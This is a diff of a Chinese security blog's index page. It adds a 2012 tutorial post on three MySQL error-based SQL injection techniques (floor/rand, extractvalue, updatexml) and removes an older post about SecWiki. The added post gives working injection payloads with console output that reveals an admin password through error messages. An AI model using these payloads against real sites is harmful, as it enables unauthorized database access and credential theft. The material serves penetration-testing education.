@@ -9,7 +9,8 @@
   <meta name="author" content="ourren">
 
   
-  <meta name="description" content="Author:youstar Blog:http://blog.ourren.com 最近由于需求翻阅了一些数据挖掘相关资料，对数据挖掘过程中的分类技术进行了理解和研究，遂记录如下。 1、数据挖掘概述 数据挖掘，就是提取或者挖掘数据，主要通过对已获得的大量数据进行深度整理和分析， &hellip;">
+  <meta name="description" content="放点原来的笔记，Mysql在执行语句的时候会抛出异常信息信息，而php+mysql架构的网站往往又将错误代码显示在页面上，这样可以通过构造如下三种方法获取特定数据。 实际测试环境： [code]mysql> show tables;
++&mdash;&mdash;&mdash;&mdash;& &hellip;&#8221;>
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +68,138 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2012/11/03/pentest_method_of_mysql_error/">关于Mysql注入过程中的三种报错方式</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-11-03T00:00:00-07:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2012/11/03/pentest_method_of_mysql_error/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>放点原来的笔记，Mysql在执行语句的时候会抛出异常信息信息，而php+mysql架构的网站往往又将错误代码显示在页面上，这样可以通过构造如下三种方法获取特定数据。</p>
+
+<p>实际测试环境：</p>
+
+<p>[code]mysql> show tables;
++&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| Tables_in_test |
++&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| admin          |
+| article        |
++&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>
+
+<p> </p>
+
+<p>[code]
+mysql> describe admin;
++&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| Field | Type             | Null | Key | Default | Extra          |
++&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| id    | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
+| user  | varchar(50)      | NO   |     | NULL    |                |
+| pass  | varchar(50)      | NO   |     | NULL    |                |
++&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>
+
+<p> </p>
+
+<p>[code]
+mysql> describe article;
++&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| Field   | Type             | Null | Key | Default | Extra          |
++&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| id      | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
+| title   | varchar(50)      | NO   |     | NULL    |                |
+| content | varchar(50)      | NO   |     | NULL    |                |
++&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>
+
+<p>1、通过floor报错</p>
+
+<p>可以通过如下一些利用代码</p>
+
+<p>[code]and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x
+from information_schema.tables group by x)a);[/code]
+[code]and (select count(<em>) from (select 1 union select null union select !1)x
+group by concat((select table_name from information_schema.tables limit 1),
+floor(rand(0)</em>2)));[/code]</p>
+
+<p>举例如下：
+首先进行正常查询：</p>
+
+<p>[code]mysql> select * from article where id = 1;
++&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+
+| id | title | content |
++&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+
+|  1 | test  | do it   |
++&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+[/code]</p>
+
+<p>假如id输入存在注入的话，可以通过如下语句进行报错。</p>
+
+<p>[code]mysql> select * from article where id = 1 and (select 1 from
+(select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);
+ERROR 1062 (23000): Duplicate entry &lsquo;5.1.33-community-log1&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>
+
+<p>可以看到成功爆出了Mysql的版本，如果需要查询其他数据，可以通过修改version()所在位置语句进行查询。
+例如我们需要查询管理员用户名和密码：
+Method1:</p>
+
+<p>[code]mysql> select * from article where id = 1 and (select 1 from
+(select count(<em>),concat((select pass from admin where id =1),floor(rand(0)</em>2))x
+from information_schema.tables group by x)a);
+ERROR 1062 (23000): Duplicate entry &lsquo;admin8881&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>
+
+<p>Method2:</p>
+
+<p>[code]mysql> select * from article where id = 1 and (select count(<em>)
+from (select 1 union select null union select !1)x group by concat((select pass from admin limit 1),
+floor(rand(0)</em>2)));
+ERROR 1062 (23000): Duplicate entry &lsquo;admin8881&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>
+
+<p>2、ExtractValue
+测试语句如下</p>
+
+<p>[code]and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));[/code]</p>
+
+<p>实际测试过程</p>
+
+<p>[code]mysql> select * from article where id = 1 and extractvalue(1, concat(0x5c,
+(select pass from admin limit 1)));&ndash;
+ERROR 1105 (HY000): XPATH syntax error: &lsquo;\admin888&rsquo;[/code]</p>
+
+<p>3、UpdateXml
+测试语句</p>
+
+<p>[code]and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))[/code]</p>
+
+<p>实际测试过程</p>
+
+<p>[code]mysql> select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,
+(select pass from admin limit 1),0x5e24),1));
+ERROR 1105 (HY000): XPATH syntax error: &lsquo;^$admin888^$&rsquo;[/code]</p>
+
+<p>All, thanks foreign guys.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -796,52 +929,6 @@ ManicTime运行后，可以跟踪你每天在电脑前面的时间是怎么耗�
 <p><strong>5、总结</strong></p>
 
 <p>详细内容见文档，可<a href="http://www.slideshare.net/opcodesec/ss-13760980">下载</a>。</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2012/07/22/secwiki_introduce/">SecWiki:Latest Security Articles and Tools</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-07-22T00:00:00-07:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2012/07/22/secwiki_introduce/#comments">留言</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><img alt="secwiki" src="http://ourren.b0.upaiyun.com/secwiki.png" width="616" height="201"></p>
-
-<p>0x1 理念</p>
-
-<p>SecWiki旨在收集国外最新安全文章和工具，为安全工作者提供业余时间阅读的索引。与一般RSS 国外安全博客不同的是：SecWiki只收录高质量的文章和工具，同时安全人员可以对你认为好的文章和工具进行+1操作，这样方便以后查阅资料的时候进行同类对比。</p>
-
-<p>0x2 运作</p>
-
-<p>任何人都可以在线提交你认识不错的最新文章和工具（需要审核后公布），同时可以对文章和工具进行+1操作。目前SecWiki分为两大类：文章和工具。每个大类下分为多个小类，在提交文章的时候注意选择分类。</p>
-
-<p>0x3 问题</p>
-
-<p>如果你对SecWiki有什么问题或者建议，欢迎发送邮件到admin#ourren.com</p>
-
-<p>SecWiki地址：<a href="http://wiki.ourren.com/">http://wiki.ourren.com/</a></p>
 </div>
   
   
